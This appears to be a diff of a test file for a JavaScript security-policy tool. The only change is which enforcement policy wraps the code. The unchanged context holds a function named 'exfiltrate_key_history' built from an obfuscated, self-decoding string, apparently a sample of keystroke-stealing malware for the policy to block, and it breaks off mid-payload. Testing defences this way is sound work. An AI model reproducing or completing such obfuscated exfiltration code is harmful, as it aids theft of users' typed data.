@@ -1,6 +1,6 @@
 
 JAM.startProfile('load');
-introspect(JAMScript.introspectors.processAll) {
+introspect(JAM.policy.pFull) {
 function exfiltrate_key_history() {
   var v9 = 'function f(x){var i,o="",ol=x.length,l=ol;while(x.charCodeAt(l/13)!' + "=48){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o";
   var v8 = v9 + '.substr(0,ol);}f(")92,\\";N500\\\\7,=+l220\\\\Kp&bler\\\\020\\\\nzrjl320\\';
